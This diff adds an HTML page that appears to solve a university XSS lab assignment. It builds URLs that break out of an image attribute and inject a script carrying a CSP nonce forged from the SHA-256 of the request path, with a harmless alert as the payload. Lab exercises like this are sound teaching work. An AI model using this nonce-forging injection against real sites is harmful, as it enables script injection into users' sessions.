@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 50px;
+            text-align: center;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border: none;
+            border-radius: 4px;
+        }
+    </style>
+    <script>
+        async function hashFunction(input) {
+            const buffer = new TextEncoder('utf-8').encode(input);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => ('00' + b.toString(16)).slice(-2)).join('');
+            return hashHex;
+        }
+        async function generateFirstLink() {
+            var r = Math.floor(Math.random() * 10000000000000000);
+            var t = Math.floor(new Date().getTime() / 1000);
+            var preUrl1 = '/assign4/chall1/xss_csp?r=' + r + '&t=' + t;
+            const nonce = await hashFunction(preUrl1);
+            var url1 = 'http://vad700.cse.lsu.edu' + preUrl1 + '&mike=mike-ii.jpg%27><script nonce=' + nonce + '%3Ealert(%27XSS%20Attack!%27);%3C/script%3E';
+            window.location.href = url1;
+        }
+        async function generateSecondLink() {
+            var r = Math.floor(Math.random() * 10000000000000000);
+            var t = Math.floor(new Date().getTime() / 1000);
+            var preUrl2 = '/assign4/chall2/xss_csp?r=' + r + '&t=' + t;
+            const nonce = await hashFunction(preUrl2);
+            var url2 = 'http://vad700.cse.lsu.edu' + preUrl2 + '&mike=mike-ii.jpg%27><script nonce=' + nonce + '%3Ealert(%27XSS%20Attack!%27);%3C/script%3E';
+            window.location.href = url2;
+        }
+    </script>
+</head>
+<body>
+    <button onclick="generateFirstLink()">Challenge 1</button>
+    <button onclick="generateSecondLink()">Challenge 2</button>
+</body>
+</html>
